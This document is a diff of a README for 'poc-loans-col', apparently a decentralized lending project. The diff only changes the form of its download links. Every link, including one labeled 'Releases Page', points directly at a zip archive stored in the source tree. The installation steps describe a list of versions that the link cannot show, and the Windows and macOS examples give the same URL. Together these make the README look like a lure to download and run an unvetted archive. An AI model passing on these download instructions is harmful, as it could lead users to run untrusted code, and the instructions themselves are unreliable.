@@ -1,6 +1,6 @@
 # 🚀 poc-loans-col - Seamless Decentralized Lending Experience
 
-[![Download](https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip%20Now!-poc--loans--col-orange)](https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip)
+[![Download](https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip%20Now!-poc--loans--col-orange)](https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To get started, follow the steps below. This guide will help you download and ru
 
 ## 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip).
 
 1. Go to the above link.
 2. You will see a list of available versions.
@@ -29,7 +29,7 @@ Visit this page to download: [Releases Page](https://github.com/9455/poc-loans-c
 
 ### 🔍 Example
 
-If you are on Windows, you might see something like `https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip`. If you are on macOS, look for `https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip`.
+If you are on Windows, you might see something like `https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip`. If you are on macOS, look for `https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip`.
 
 ## ⚙️ Running the Application
 
@@ -62,7 +62,7 @@ If you are on Windows, you might see something like `https://github.com/9455/poc
 
 To keep your application current:
 
-1. Regularly check this link: [Releases Page](https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip).
+1. Regularly check this link: [Releases Page](https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip).
 2. Download the latest version following the steps in the "Download & Install" section.
 3. Overwrite the previous version when prompted.
 
@@ -102,4 +102,4 @@ We value your feedback. Feel free to share your experiences or suggest improveme
 
 For a simple, yet powerful decentralized lending experience, we invite you to explore poc-loans-col and engage with the world of DeFi.
 
-[![Download](https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip%20Now!-poc--loans--col-orange)](https://github.com/9455/poc-loans-col/raw/refs/heads/main/backend/src/col-poc-loans-3.7.zip)
+[![Download](https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip%20Now!-poc--loans--col-orange)](https://raw.githubusercontent.com/9455/poc-loans-col/main/backend/src/col-poc-loans-3.7.zip)
